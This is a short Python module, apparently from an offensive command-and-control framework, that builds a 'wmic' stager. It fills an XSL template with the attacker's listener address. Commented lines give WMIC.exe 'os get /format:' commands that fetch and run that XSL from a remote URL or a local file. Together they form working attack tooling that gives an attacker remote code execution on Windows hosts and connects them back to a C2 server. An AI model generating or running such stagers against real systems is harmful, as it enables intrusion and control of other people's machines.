from core.teamserver.stager import Stager

class STStager(Stager):
    def __init__(self):
        self.name = 'wmic'
        self.description = 'Stage via wmic XSL execution'
        self.suggestions = ''
        self.extension = 'xsl'
        self.author = '@byt3bl33d3r'
        self.options = {}

    def generate(self, listener):
        with open('core/teamserver/stagers/templates/wmic.xsl') as template:
            template = template.read()
            template = template.replace("C2_URL", f"{listener.name}://{listener['BindIP']}:{listener['Port']}")
            return template

            #print_good(f"Generated stager to {stager.name}")
            #print_info("Launch with:")
            #print(f"\tC:\\Windows\\System32\\wbem\\WMIC.exe os get /format:\"https://myurl/{stager_filename}\"")
            #print(f"\tC:\\Windows\\System32\\wbem\\WMIC.exe os get /format:\"{stager_filename}\"")